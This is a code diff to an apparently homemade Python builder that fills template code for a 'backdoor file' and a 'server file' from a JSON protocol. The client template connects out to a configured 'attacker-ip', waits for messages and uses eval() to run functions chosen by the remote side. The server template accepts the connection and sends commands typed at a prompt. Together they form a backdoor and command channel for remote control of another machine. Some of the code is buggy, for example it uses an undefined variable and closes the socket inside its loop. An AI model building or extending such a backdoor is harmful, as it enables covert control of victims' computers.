@@ -3,29 +3,101 @@ import ast
 
 
 SETUP_CODE_FOR_CLIENT = """
-import socket
-import json
+	import socket
+	import json
 
-protocol = json.loads(___INSERTED_PROTOCOL___)
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket.connect((protocol.get("attacker-ip"), protocol.get("acceptable-ports")[0]))
-socket.send("hi".encode())
-socket.close()
+	context = {}
+
+	context["protocol"] = json.loads(___INSERTED_PROTOCOL___)
+	context["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	context["socket"].connect((context.get("protocol").get("attacker-ip"), context.get("protocol").get("acceptable-ports")[0]))
+
+	suffix = context.get("protocol").get("message-suffix")
+	suffix = "" if suffix == None else suffix
+
+	normal_sub_proto = context.get("protocol").get("normal-sub-protocol")
+
+	if context.get("protocol").get("handshake-sub-protocol"):
+		hs_sub_proto = context.get("protocol").get("handshake-sub-protocol")
+		if not hs_sub_proto.get("server") or not hs_sub_proto.get("client"):
+			print("Error: Invalid handshake sub-protocol.")
+			context.get("socket").close()
+
+		hs_server_proto = hs_sub_proto.get("server")
+		hs_client_proto = hs_sub_proto.get("client")
+
+		if not hs_server_proto.get("unconditional-sequence") or not hs_client_proto.get("unconditional-sequence"):
+			print("Error: Invalid handshake sub-protocol.")
+			context.get("socket").close()
+		
+		for message in hs_client_proto.get("unconditional-sequence"):
+			context.get("socket").send(message.encode())
+			data = context.get("socket").recv(context.get("protocol").get("buffer-size"))
+			break # for now
+
+	while True:
+		context["data"] = context.get("socket").recv(context.get("protocol").get("buffer-size"))
+	
+		if normal_sub_proto.get("function-configurations"):
+			for function_configuration in normal_sub_proto.get("function-configurations"):
+				if function_configuration.get("data-must-equal"):
+					if context.get("data").decode().strip(suffix) == function_configuration.get("data-must-equal"):
+						eval(f"{function_configuration.get('function-to-call-on-match')}(context)")
+				elif function_configuration.get("data-must-be-prefixed"):
+					if data.decode().startswith(function_configuration.get('data-must-be-prefixed')):
+						eval(f"{function_configuration.get('function-to-call-on-match')}(context)")
+				elif function_configuration.get("data-can-be-anything"):
+					eval(f"{function_configuration.get('function-to-call-on-match')}(context)")
+				else:
+					print("Error: Invalid function configuration.")
+		else:
+			print("Error: No function configurations found.")
+		context.get("socket").close()
+	
+	context.get("connection").close()
 """
 
 SETUP_CODE_FOR_SERVER = """
-import socket
-import json
+	import socket
+	import json
 
-protocol = json.loads(___INSERTED_PROTOCOL___)
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket.bind(("0.0.0.0", protocol.get("acceptable-ports")[0]))
-socket.listen(1)
-connection, address = socket.accept()
-print("Connection from", address)
-data = connection.recv(1024)
-print(data.decode())
-connection.close()
+	context = {}
+
+	context["protocol"] = json.loads(___INSERTED_PROTOCOL___)
+	context["socket"] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	context.get("socket").bind(("0.0.0.0", context.get("protocol").get("acceptable-ports")[0]))
+	context.get("socket").listen(1)
+
+	context["connection"], context["address"] = context.get("socket").accept()
+
+	suffix = context.get("protocol").get("message-suffix")
+	suffix = "" if suffix == None else suffix
+
+	if context.get("protocol").get("handshake-sub-protocol"):
+		hs_sub_proto = context.get("protocol").get("handshake-sub-protocol")
+		if not hs_sub_proto.get("server") or not hs_sub_proto.get("client"):
+			print("Error: Invalid handshake sub-protocol.")
+			context.get("connection").close()
+		
+		hs_server_proto = hs_sub_proto.get("server")
+		hs_client_proto = hs_sub_proto.get("client")
+
+		if not hs_server_proto.get("unconditional-sequence") or not hs_client_proto.get("unconditional-sequence"):
+			print("Error: Invalid handshake sub-protocol.")
+			context.get("connection").close()
+		
+		for message in hs_server_proto.get("unconditional-sequence"):
+			context.get("connection").send(message.encode())
+			data = context.get("connection").recv(context.get("protocol").get("buffer-size"))
+			break # for now
+
+	while True:
+		command = input(">>> ")
+		context.get("connection").send(f"{command}\u0003".encode())
+	
+	context.get("connection").close()
 """
 
 
@@ -52,6 +124,12 @@ def paste_protocol(file, mode):
 	protocol = ""
 	with open("protocol.json", "r") as f: protocol = f.read()
 
+	pos = protocol.find("\\u0003")
+	while pos != -1:
+		new_protocol = ""
+		new_protocol += protocol[:pos] + "\\" + protocol[pos:]
+		protocol = new_protocol
+		pos = protocol.find("\\u", pos+5)
 
 	with open(new_file_name, "w") as f:
 		tree = ast.parse(file[1])
@@ -157,6 +235,7 @@ def determine_files(files_to_modify):
 
 def build():
 	files = get_file_content()
+
 	if len(files) != 2:
 		print("Error: There must be exactly one backdoor file and one server file.")
 		return
@@ -164,7 +243,7 @@ def build():
 	files_to_modify = get_files_to_modify(files)
 	if not check_main_function_declared(files_to_modify):
 		print("Error: Both files must have a main function declared.")
-		return 
+		return
 	if not check_main_function_called(files_to_modify):
 		print("Error: The main function must not be called.")
 		return
